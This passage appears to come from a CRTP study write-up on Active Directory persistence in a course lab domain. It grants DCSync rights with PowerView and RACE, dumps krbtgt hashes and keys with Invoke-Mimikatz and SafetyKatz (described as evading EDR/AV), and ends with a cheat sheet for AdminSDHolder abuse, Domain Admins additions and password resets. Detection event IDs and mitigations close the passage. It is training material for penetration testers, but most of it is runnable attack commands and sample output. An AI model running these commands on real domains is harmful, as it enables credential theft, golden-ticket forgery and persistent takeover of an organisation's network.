└──────────────────────────────────────────────────────────────────┘
```

---

## Adding DCSync Rights — The Crown Jewel of Persistence

### What DCSync Needs

To perform a DCSync attack, a principal needs **two specific extended rights** on the domain object:
- **DS-Replication-Get-Changes** (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
- **DS-Replication-Get-Changes-All** (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)

```
┌──────────────────────────────────────────────────────────────────┐
│              DCSYNC PERSISTENCE FLOW                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Grant DCSync Rights to student1                         │
│  ┌─────────────────────────────────────────────┐                 │
│  │ Add-DomainObjectAcl -Rights DCSync          │                 │
│  │ → Grants two GUIDs:                         │                 │
│  │   1131f6aa... (Get-Changes)                 │                 │
│  │   1131f6ad... (Get-Changes-All)             │                 │
│  └──────────────────┬──────────────────────────┘                 │
│                     │                                            │
│                     ▼                                            │
│  Step 2: student1 can now impersonate a Domain Controller        │
│  ┌─────────────────────────────────────────────┐                 │
│  │ student1's machine                 DC       │                 │
│  │ ┌──────────────┐  DsGetNCChanges  ┌──────┐  │                │
│  │ │ SafetyKatz   │ ───────────────► │      │  │                │
│  │ │ dcsync       │  "Replicate me   │ LDAP │  │                │
│  │ │              │   the password   │      │  │                │
│  │ │              │   data for       │      │  │                │
│  │ │              │   krbtgt"        │      │  │                │
│  │ │              │ ◄─────────────── │      │  │                │
│  │ │              │  Hash + Keys     │      │  │                │
│  │ └──────────────┘                  └──────┘  │                │
│  └─────────────────────────────────────────────┘                 │
│                     │                                            │
│                     ▼                                            │
│  Step 3: GOLDEN TICKET → Total Domain Ownership                  │
│  ┌─────────────────────────────────────────────┐                 │
│  │ krbtgt Hash → Forge TGTs for ANY user       │                 │
│  │ → Survives password resets                   │                 │
│  │ → Persists until krbtgt reset TWICE          │                 │
│  │ → Access ANY service in the domain           │                 │
│  └─────────────────────────────────────────────┘                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Granting DCSync Rights — PowerView

The `-Rights DCSync` parameter in PowerView is a **shorthand** that applies both required replication GUIDs to the target identity.

```powershell
# ============================================================
# GRANT DCSYNC RIGHTS — PowerView
# ============================================================

Add-DomainObjectAcl `
    -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity student1 `
    -Rights DCSync `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(|(samAccountName=student1)(name=student1)(displayname=student1)))
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         'DCSync' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on
         DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on
         DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on
         DC=dollarcorp,DC=moneycorp,DC=local
```

> Three GUIDs are granted: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, and DS-Replication-Get-Changes-In-Filtered-Set. All three together enable full DCSync capability.
{: .prompt-info }

### Granting DCSync Rights — ActiveDirectory Module and RACE

```powershell
# ============================================================
# GRANT DCSYNC RIGHTS — RACE Toolkit
# ============================================================

Set-ADACL `
    -SamAccountName studentuser1 `
    -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' `
    -GUIDRight DCSync `
    -Verbose
```

#### Example Output

```
VERBOSE: Connecting to dollarcorp.moneycorp.local...
VERBOSE: Granting DS-Replication-Get-Changes to studentuser1
VERBOSE: Granting DS-Replication-Get-Changes-All to studentuser1
VERBOSE: Successfully granted DCSync rights to studentuser1
```

---

## Executing DCSync

Once you have granted the necessary replication rights to your user account, you can perform the actual DCSync operation. This allows you to pull the password hashes of sensitive accounts **without ever touching the Domain Controller's memory**.

### Why Target the krbtgt Account?

```
┌──────────────────────────────────────────────────────────────────┐
│              WHY krbtgt IS THE ULTIMATE TARGET                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  The krbtgt account is the Key Distribution Center (KDC)         │
│  service account. Obtaining its NTLM hash is the ultimate        │
│  goal for domain persistence because it allows you to:           │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 1. FORGE GOLDEN TICKETS                                   │   │
│  │    Create a Ticket Granting Ticket (TGT) for ANY user     │   │
│  │    — even non-existent ones — with ANY group memberships  │   │
│  │    (like Domain Admins, Enterprise Admins, etc.)          │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 2. MAINTAIN ACCESS                                        │   │
│  │    Even if ALL other domain passwords are changed, a      │   │
│  │    Golden Ticket remains valid until the krbtgt password   │   │
│  │    is changed TWICE (AD maintains the current AND         │   │
│  │    previous password for krbtgt).                         │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 3. TOTAL DOMAIN OWNERSHIP                                 │   │
│  │    A Golden Ticket grants the ability to access ANY       │   │
│  │    service or machine within the Active Directory forest. │   │
│  │    It's the closest thing to a "God mode" in AD.          │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  krbtgt Password Reset Timeline:                                 │
│  ┌─────────────────────────────────────────────────┐             │
│  │ Reset #1: Golden Ticket STILL WORKS             │             │
│  │           (AD keeps previous password as backup) │             │
│  │                                                   │             │
│  │ Reset #2: Golden Ticket INVALIDATED              │             │
│  │           (both current and previous changed)     │             │
│  │                                                   │             │
│  │ ★ Many orgs never reset krbtgt!                  │             │
│  │ ★ Even after incident response, they may only    │             │
│  │   reset once — leaving the Golden Ticket valid!  │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Using Invoke-Mimikatz

```powershell
# ============================================================
# DCSYNC — Using Invoke-Mimikatz (PowerShell loaded)
# ============================================================

# Load Invoke-Mimikatz into your session
. .\Invoke-Mimikatz.ps1

# Execute DCSync targeting krbtgt
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

#### Example Output

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'
  '#####'

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt

[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 11:59:25 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688200-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: 00000000000000000000000000000000

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e728f9cc6975e264e22adb0ced3c5918
      des_cbc_md5       (4096) : 150867a88bb23e50

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150867a88bb23e50

* Packages *
    Kerberos

* Primary:WDigest *
    01  3e0e3d7e0b3e...
    02  b1a2c3d4e5f6...
    ...
```

### Using SafetyKatz

SafetyKatz is a C# wrapper for Mimikatz that loads it in memory and cleans up afterwards — commonly used to bypass basic EDR/AV detections.

```powershell
# ============================================================
# DCSYNC — Using SafetyKatz
# ============================================================

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

#### Example Output

```
[*] SafetyKatz - Loading Mimikatz in memory...
[*] Minidump generated successfully
[*] Executing Mimikatz command...

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'
  '#####'

mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt

[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 11:59:25 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688200-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: 00000000000000000000000000000000

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e728f9cc6975e264e22adb0ced3c5918
      des_cbc_md5       (4096) : 150867a88bb23e50

mimikatz(commandline) # exit
Bye!

[*] SafetyKatz - Cleanup complete.
```

### What You Extract from DCSync

```
┌──────────────────────────────────────────────────────────────────┐
│              DCSYNC OUTPUT — CREDENTIAL MAP                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  For the krbtgt account, you now have:                           │
│                                                                  │
│  ┌────────────────────┬──────────────────────────────────────┐   │
│  │ Credential         │ What You Can Do With It              │   │
│  ├────────────────────┼──────────────────────────────────────┤   │
│  │ NTLM Hash          │ → Golden Ticket (forge any TGT)     │   │
│  │ ff46a9d8bd66c...   │ → Pass-the-Hash                     │   │
│  │                    │ → Over-Pass-the-Hash                 │   │
│  │                    │                                      │   │
│  │ AES256 Key         │ → Golden Ticket (better OPSEC)      │   │
│  │ 154cb6624b1d8...   │ → OPTH with AES256                  │   │
│  │                    │ → Kerberos delegation abuse          │   │
│  │                    │                                      │   │
│  │ AES128 Key         │ → Same as AES256 (fallback)         │   │
│  │ e728f9cc6975e...   │                                      │   │
│  └────────────────────┴──────────────────────────────────────┘   │
│                                                                  │
│  With these credentials, the attacker can:                       │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │ ★ Forge TGTs for ANY user in the domain                │     │
│  │ ★ Access ANY machine in the forest                      │     │
│  │ ★ Impersonate Domain Admins, Enterprise Admins          │     │
│  │ ★ Create tickets for non-existent users                 │     │
│  │ ★ Survive full domain password resets                   │     │
│  │ ★ Persist until krbtgt is reset TWICE                   │     │
│  └─────────────────────────────────────────────────────────┘     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Complete Attack Path Summary

```
┌──────────────────────────────────────────────────────────────────┐
│       COMPLETE ADMINSDHOLDER PERSISTENCE ATTACK PATH             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────┐            │
│  │ PREREQUISITE: Domain Admin access (initial)      │            │
│  └───────────────────────┬──────────────────────────┘            │
│                          │                                       │
│  ┌───────────────────────▼──────────────────────────┐            │
│  │ PATH A: AdminSDHolder Persistence                 │            │
│  │                                                   │            │
│  │ 1. Modify AdminSDHolder ACL                       │            │
│  │    → Add-DomainObjectAcl -Rights All              │            │
│  │    OR -Rights ResetPassword                       │            │
│  │    OR -Rights WriteMembers                        │            │
│  │                                                   │            │
│  │ 2. Wait for SDProp (or trigger manually)          │            │
│  │    → Invoke-SDPropagator                          │            │
│  │                                                   │            │
│  │ 3. Verify permissions propagated                  │            │
│  │    → Get-DomainObjectAcl -Identity 'Domain Admins'│            │
│  │                                                   │            │
│  │ 4. Exploit: Add to DA or Reset password           │            │
│  │    → Add-DomainGroupMember -Identity 'Domain      │            │
│  │      Admins' -Members testda                      │            │
│  │    OR Set-DomainUserPassword -Identity testda     │            │
│  └───────────────────────┬──────────────────────────┘            │
│                          │                                       │
│  ┌───────────────────────▼──────────────────────────┐            │
│  │ PATH B: Domain Root FullControl                   │            │
│  │                                                   │            │
│  │ 1. Grant GenericAll on domain root                │            │
│  │    → Add-DomainObjectAcl -TargetIdentity          │            │
│  │      'DC=dollarcorp,...' -Rights All               │            │
│  │                                                   │            │
│  │ 2. Can now manipulate ANY domain object           │            │
│  │    → Create users, modify GPOs, change trusts     │            │
│  └───────────────────────┬──────────────────────────┘            │
│                          │                                       │
│  ┌───────────────────────▼──────────────────────────┐            │
│  │ PATH C: DCSync Rights (Crown Jewel)               │            │
│  │                                                   │            │
│  │ 1. Grant DCSync permissions                       │            │
│  │    → Add-DomainObjectAcl -Rights DCSync           │            │
│  │    OR Set-ADACL -GUIDRight DCSync                 │            │
│  │                                                   │            │
│  │ 2. Execute DCSync from normal user context        │            │
│  │    → SafetyKatz.exe "lsadump::dcsync              │            │
│  │      /user:dcorp\krbtgt" "exit"                   │            │
│  │                                                   │            │
│  │ 3. Forge Golden Ticket → TOTAL DOMAIN OWNERSHIP   │            │
│  └──────────────────────────────────────────────────┘            │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## CRTP Quick Reference Card

```
┌──────────────────────────────────────────────────────────────────┐
│            CRTP ADMINSDHOLDER PERSISTENCE CHEAT SHEET             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ═══ MODIFY ADMINSDHOLDER ═══                                    │
│                                                                  │
│  # FullControl (PowerView):                                      │
│  Add-DomainObjectAcl -TargetIdentity `                           │
│    'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,`      │
│    DC=local' -PrincipalIdentity student1 -Rights All `           │
│    -PrincipalDomain dollarcorp.moneycorp.local `                 │
│    -TargetDomain dollarcorp.moneycorp.local -Verbose             │
│                                                                  │
│  # FullControl (RACE):                                           │
│  Set-DCPermissions -Method AdminSDHolder `                       │
│    -SAMAccountName student1 -Right GenericAll `                  │
│    -DistinguishedName 'CN=AdminSDHolder,...' -Verbose            │
│                                                                  │
│  # ResetPassword only:                                           │
│  Add-DomainObjectAcl ... -Rights ResetPassword                   │
│                                                                  │
│  # WriteMembers only:                                            │
│  Add-DomainObjectAcl ... -Rights WriteMembers                    │
│                                                                  │
│  ═══ TRIGGER SDPROP ═══                                          │
│  Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose    │
│                                                                  │
│  ═══ VERIFY PERMISSIONS ═══                                      │
│                                                                  │
│  # PowerView:                                                    │
│  Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs    │
│    | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName'│
│    $(Convert-SidToName $_.SecurityIdentifier);$_}               │
│    | ?{$_.IdentityName -match "student1"}                       │
│                                                                  │
│  # AD Module:                                                    │
│  (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,`  │
│    DC=moneycorp,DC=local').Access |                              │
│    ?{$_.IdentityReference -match 'student1'}                    │
│                                                                  │
│  ═══ EXPLOIT: ADD TO DOMAIN ADMINS ═══                           │
│  Add-DomainGroupMember -Identity 'Domain Admins' `               │
│    -Members testda -Verbose               # PowerView            │
│  Add-ADGroupMember -Identity 'Domain Admins' `                   │
│    -Members testda                        # AD Module            │
│                                                                  │
│  ═══ EXPLOIT: RESET PASSWORD ═══                                 │
│  Set-DomainUserPassword -Identity testda -AccountPassword `      │
│    (ConvertTo-SecureString "Password@123" `                      │
│    -AsPlainText -Force) -Verbose          # PowerView            │
│  Set-ADAccountPassword -Identity testda -NewPassword `           │
│    (ConvertTo-SecureString "Password@123" `                      │
│    -AsPlainText -Force) -Verbose          # AD Module            │
│                                                                  │
│  ═══ DOMAIN ROOT FULLCONTROL ═══                                 │
│  Add-DomainObjectAcl -TargetIdentity `                           │
│    'DC=dollarcorp,DC=moneycorp,DC=local' `                       │
│    -PrincipalIdentity student1 -Rights All -Verbose              │
│                                                                  │
│  ═══ GRANT DCSYNC RIGHTS ═══                                     │
│  Add-DomainObjectAcl -TargetIdentity `                           │
│    'DC=dollarcorp,DC=moneycorp,DC=local' `                       │
│    -PrincipalIdentity student1 -Rights DCSync -Verbose           │
│                                                                  │
│  ═══ EXECUTE DCSYNC ═══                                          │
│  Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'│
│  SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Detection and Blue Team Indicators

```
┌──────────────────────────────────────────────────────────────────┐
│           DETECTION & BLUE TEAM INDICATORS                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Event IDs to Monitor:                                           │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ 5136 — Directory Service Object Modified                 │    │
│  │        Monitor for changes to AdminSDHolder's            │    │
│  │        nTSecurityDescriptor attribute                    │    │
│  │                                                          │    │
│  │ 4728 — Member Added to Security-Enabled Global Group     │    │
│  │        Alert on additions to Domain Admins               │    │
│  │                                                          │    │
│  │ 4756 — Member Added to Universal Security Group          │    │
│  │        Alert on additions to Enterprise Admins           │    │
│  │                                                          │    │
│  │ 4724 — Password Reset Attempt                            │    │
│  │        Monitor for resets on protected accounts          │    │
│  │                                                          │    │
│  │ 4662 — An Operation Was Performed on an Object           │    │
│  │        With replication GUIDs → DCSync detection         │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Key Mitigations:                                                │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │ • Regularly audit AdminSDHolder ACL for unauthorized ACEs│    │
│  │ • Monitor adminCount=1 objects for unexpected entries    │    │
│  │ • Alert on nTSecurityDescriptor changes to AdminSDHolder │    │
│  │ • Restrict who can modify the AdminSDHolder object       │    │
│  │ • Set ms-DS-MachineAccountQuota to 0                     │    │
│  │ • Enable advanced auditing on the System container       │    │
│  │ • Reset krbtgt password TWICE during incident response   │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## References

- [AdminSDHolder Persistence — Ultimate Windows Security](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=fec4bbe5-7592-4fad-8d0f-8dbc960c88ee)
- [Domain Persistence — AdminSDHolder — Penetration Testing Lab](https://pentestlab.blog/2022/01/04/domain-persistence-adminsdholder/)
- [Admin SD Holder Abuse — Netwrix Community](https://community.netwrix.com/t/admin-sd-holder-abuse/121582)
- [Defending Against AdminSDHolder Attacks — Cayosoft](https://www.cayosoft.com/defending-active-directory-against-adminsdholder-attacks/)
- [CRTP Notes — AdminSDHolder — dev-angelist GitBook](https://dev-angelist.gitbook.io/crtp-notes/readme/network-security-6/8.7-persistence-via-acls/8.7.1-adminsdholder)
- [Active Directory Persistence — BorderGate](https://www.bordergate.co.uk/active-directory-persistence/)
- [AdminSDHolder Pitfalls — Secure Identity](https://secureidentity.se/adminsdholder-pitfalls-and-misunderstandings/)
- [Hidden Persistence: AdminSDHolder Abuse — LinkedIn](https://www.linkedin.com/pulse/hidden-persistence-mechanism-abusing-adminsdholder-active-oy2lc)
- [Microsoft Docs — AdminSDHolder, Protected Groups, SDProp](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [MITRE ATT&CK T1098 — Account Manipulation](https://attack.mitre.org/techniques/T1098/)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
